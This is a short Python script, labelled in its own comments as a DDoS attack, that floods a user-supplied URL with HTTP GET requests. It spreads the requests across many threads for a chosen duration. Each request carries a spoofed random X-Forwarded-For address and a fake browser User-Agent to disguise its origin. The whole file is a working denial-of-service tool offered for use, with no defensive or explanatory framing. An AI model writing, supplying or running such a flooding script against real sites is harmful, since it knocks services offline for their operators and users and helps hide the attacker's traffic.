import requests
import threading
import random
import time

def send_request(url, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Generate random IP address and headers
            ip_address = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            headers = {
                "X-Forwarded-For": ip_address,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            
            # Send HTTP GET request to the target URL
            response = requests.get(url, headers=headers)
            
            # Check if the request was successful
            if response.status_code == 200:
                print(f"Request sent to {url} with IP: {ip_address}")
            else:
                print(f"Request failed with status code: {response.status_code}")
        except:
            print("An error occurred while sending the request.")

def start_attack(url, num_threads, duration):
    threads = []
    
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url, duration))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

# Get user input for the target URL, number of threads, and duration
url = input("Enter the target URL: ")
num_threads = int(input("Enter the number of threads: "))
duration = int(input("Enter the duration (in seconds): "))

# Start the DDoS attack
start_attack(url, num_threads, duration)